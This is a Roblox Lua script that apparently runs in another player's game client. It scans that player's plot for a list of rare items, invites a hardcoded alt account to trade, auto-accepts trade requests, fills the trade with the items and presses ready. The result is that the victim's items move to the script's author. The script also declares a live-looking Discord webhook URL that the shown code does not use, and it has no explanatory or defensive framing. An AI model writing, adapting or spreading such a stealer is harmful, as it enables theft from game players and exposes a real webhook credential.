if game.PlaceId ~= 109983668079237 then return end

local MY_ALT_USER = "hakimidu_95"
local LOG_WEBHOOK = "https://discord.com/api/webhooks/1491134694656311397/ofX4CsHmL97_mPLxkp5f4VKHYOAq7tlcd_3SobAZzoESre71UpxmKg-g_V-0_9o2tPqT"

local wantedItems = {
    "Tralaledon", "Strawberry Elephant", "Skibidi Toilet", "Rosey and Teddy",
    "Popcuru and Fizzuru", "Meowl", "Love Love Bear", "Los Sekolahs",
    "La Supreme Combinasion", "La Casa Boo", "Ketupat Bros", "Hydra Dragon Cannelloni",
    "Headless Horseman", "Griffin", "Fragrama and Chocrama", "Fishino Clownino",
    "Festive 67", "Dragon Gingerini", "Dragon Cannelloni", "Cooki and Milki",
    "Cerberus", "Celestial Pegasus", "Capitano Moby", "Burguro And Fryuro",
    "Los Amigos", "Fortunu and Cashuru", "Spooky and Pumpky", "Ginger Gerat",
    "La Food Combinasion", "Los Tacoritas", "La Secret Combinasion", "Money Money Puggy",
    "Ketchuru and Musturu", "La Taco Combinasion", "Garama and Madundung", "Ventoliero Pavonero",
    "Swaggy Bros", "Tuff Toucan", "W or L", "Chipso and Queso",
    "Los Spaghettis", "Los Hotspotsitos", "Tictac Sahur", "Lovin Rose", "Orcaledon",
    "Ketupat Kepat", "Tang Tang Keletang", "Lavadorito Spinito",
    "Reinito Sleighito", "Celularcini Viciosini", "Sammyni Fattini",
    "Jolly Jolly Sahur", "Fortunu and Coinuru", "Gold Gold Gold", "La Extinct Grande", "La Easter Grande", "Chillin Chilli", "Hydra Bunny",
}

local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:Connect(function()
    vu:CaptureController()
    vu:ClickButton2(Vector2.new())
end)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local playerGui = LocalPlayer.PlayerGui

local function isWantedItem(name)
    if not name then return false end
    name = name:lower():match("^%s*(.-)%s*$")
    for _, wanted in ipairs(wantedItems) do
        if name:find(wanted:lower(), 1, true) then return true end
    end
    return false
end

local function scanPlot()
    local found = {}
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return found end
    local myPlot = nil
    for _, p in ipairs(plots:GetChildren()) do
        local sign = p:FindFirstChild("PlotSign")
        if sign then
            local gui = sign:FindFirstChildOfClass("SurfaceGui")
            if gui and gui:FindFirstChildOfClass("Frame") then
                local lbl = gui.Frame:FindFirstChildOfClass("TextLabel")
                if lbl and lbl.Text:lower():find(LocalPlayer.Name:lower()) then
                    myPlot = p
                    break
                end
            end
        end
    end
    if myPlot then
        for _, child in ipairs(myPlot:GetChildren()) do
            if child:IsA("Model") and isWantedItem(child.Name) then
                table.insert(found, child.Name)
            end
        end
    end
    return found
end

local function tradeIsActive()
    local outer = playerGui:FindFirstChild("TradeLiveTrade")
    if not outer then return false end
    local inner = outer:FindFirstChild("TradeLiveTrade")
    if not inner then return false end
    local scrolling = inner:FindFirstChild("ScrollingFrame", true)
    if not scrolling then return false end
    for _, slot in pairs(scrolling:GetChildren()) do
        if slot.Name:sub(1, 9) == "Selection" then return true end
    end
    return false
end

local function sendInvite(target)
    local tl = playerGui:FindFirstChild("TradePlayerList"):FindFirstChild("TradePlayerList")
    if not tl then return false end
    local sb = tl.bg.SearchFrame.SearchBox
    sb.Text = target
    task.wait(0.1)
    pcall(function() firesignal(sb.FocusLost, true) end)
    task.wait(0.1)
    pcall(function() firesignal(sb.ReturnPressedFromOnScreenKeyboard) end)
    task.wait(0.5)
    local list = tl.Global.List
    for _, player in pairs(list:GetChildren()) do
        if player:IsA("Frame") then
            local fill = player:FindFirstChild("Fill")
            if fill and fill:FindFirstChild("Send") then
                pcall(function() firesignal(fill.Send.Activated) end)
                return true
            end
        end
    end
    return false
end

task.spawn(function()
    while true do
        pcall(function()
            local requestGui = playerGui:FindFirstChild("TradeRequest")
            if requestGui and requestGui:FindFirstChild("TradeRequest") then
                local req = requestGui.TradeRequest
                if req.Visible then
                    local accept = req:FindFirstChild("Accept", true)
                    if accept then firesignal(accept.Activated) end
                end
            end
        end)
        task.wait(0.5)
    end
end)

while true do
    local highValueItems = scanPlot()
    
    if #highValueItems > 0 then
        if not tradeIsActive() then
            sendInvite(MY_ALT_USER)
        else
            local outerGui = playerGui:FindFirstChild("TradeLiveTrade")
            local innerGui = outerGui.TradeLiveTrade
            local otherUser = innerGui.Other.Username.Text:lower()
            
            if otherUser:find(MY_ALT_USER:lower()) then
                local scrolling = innerGui:FindFirstChild("ScrollingFrame", true)
                if scrolling then
                    for _, slot in pairs(scrolling:GetChildren()) do
                        if slot.Name:sub(1, 9) == "Selection" then
                            local spacer = slot:FindFirstChild("Spacer")
                            if spacer then
                                local stroke = spacer:FindFirstChild("UIStroke")
                                if stroke and not (math.floor(stroke.Color.R * 255) == 0 and math.floor(stroke.Color.G * 255) == 255) then
                                    pcall(function() firesignal(spacer.Activated) end)
                                    task.wait(0.05)
                                end
                            end
                        end
                    end
                end
                
                task.wait(0.5)
                local readyBtn = innerGui:FindFirstChild("Other"):FindFirstChild("ReadyButton")
                local readyIndicator = innerGui:FindFirstChild("Your"):FindFirstChild("Ready")
                
                if readyBtn then
                    pcall(function() firesignal(readyBtn.Activated) end)
                end
            end
        end
    else
        if tradeIsActive() then
            local innerGui = playerGui.TradeLiveTrade.TradeLiveTrade
            local readyBtn = innerGui:FindFirstChild("Other"):FindFirstChild("ReadyButton")
            if readyBtn then pcall(function() firesignal(readyBtn.Activated) end) end
        end
    end
    task.wait(0.5)
end
